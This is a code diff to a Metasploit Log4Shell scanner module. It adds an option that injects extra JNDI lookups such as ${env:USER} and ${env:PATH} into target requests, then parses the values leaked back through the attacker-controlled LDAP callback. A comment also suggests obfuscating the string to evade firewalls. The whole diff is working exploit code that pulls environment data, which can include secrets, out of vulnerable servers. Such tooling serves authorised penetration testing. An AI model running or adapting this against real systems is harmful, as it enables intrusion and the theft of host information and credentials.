@@ -47,6 +47,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
       OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
+      OptString.new('LEAK_PARAMS', [ false, 'Additional parameters to leak, separated by the ^ character (e.g., ${env:USER}^${env:PATH})']),
       OptPath.new(
         'HEADERS_FILE',
         [
@@ -68,20 +69,41 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def log4j_jndi_string(resource = '')
-    super(resource + '/${sys:java.vendor}_${sys:java.version}')
+    resource = resource.dup
+    resource << '/${java:os}/${sys:java.vendor}_${sys:java.version}'
+    # We should add obfuscation to the URL string to scan through lousy "next-gen" firewalls
+    unless datastore['LEAK_PARAMS'].blank?
+      resource << '/'
+      resource << datastore['LEAK_PARAMS']
+    end
+    super(resource)
   end
 
   #
   # Handle incoming requests via service mixin
   #
   def build_ldap_search_response(msg_id, base_dn)
-    token, java_version = base_dn.split('/', 2)
+    token, java_os, java_version, uri_parts = base_dn.split('/', 4)
     target_info = @mutex.synchronize { @tokens.delete(token) }
     if target_info
       @mutex.synchronize { @successes << target_info }
       details = normalize_uri(target_info[:target_uri]).to_s
       details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
+      details << " (os: #{java_os})" unless java_os.blank?
       details << " (java: #{java_version})" unless java_version.blank?
+      unless uri_parts.blank?
+        uri_parts = uri_parts.split('^')
+        leaked = ''
+        datastore['LEAK_PARAMS'].split('^').each_with_index do |input, idx|
+          next if input == uri_parts[idx]
+
+          leaked << "#{input}=#{uri_parts[idx]}  "
+        end
+        unless leaked.blank?
+          details << " (leaked: #{leaked.rstrip})"
+          vprint_good("Leaked data: #{leaked.rstrip}")
+        end
+      end
       peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
       print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
       report_vuln(
